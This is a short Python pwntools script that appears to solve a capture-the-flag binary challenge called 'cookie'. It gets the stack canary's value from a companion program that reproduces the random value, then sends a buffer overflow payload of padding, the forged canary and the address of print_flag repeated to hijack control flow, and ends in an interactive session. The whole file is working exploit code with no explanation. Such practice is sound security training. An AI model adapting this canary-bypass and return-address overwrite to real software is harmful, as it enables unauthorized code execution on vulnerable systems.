from pwn import *

p = process('cookie')
#p = remote('ctf-league.osusec.org',31310)
cookie = process("./a.out") # c file with random 
e = ELF("./cookie")
winaddr = e.symbols['print_flag']
for i in range(51):
    p.sendline("3")

cook = cookie.recv()

p.sendline(b'aaaabbbbccccddddeeeeffffgggg' + p32(int(cook)) + p64(winaddr)*3)
p.interactive()


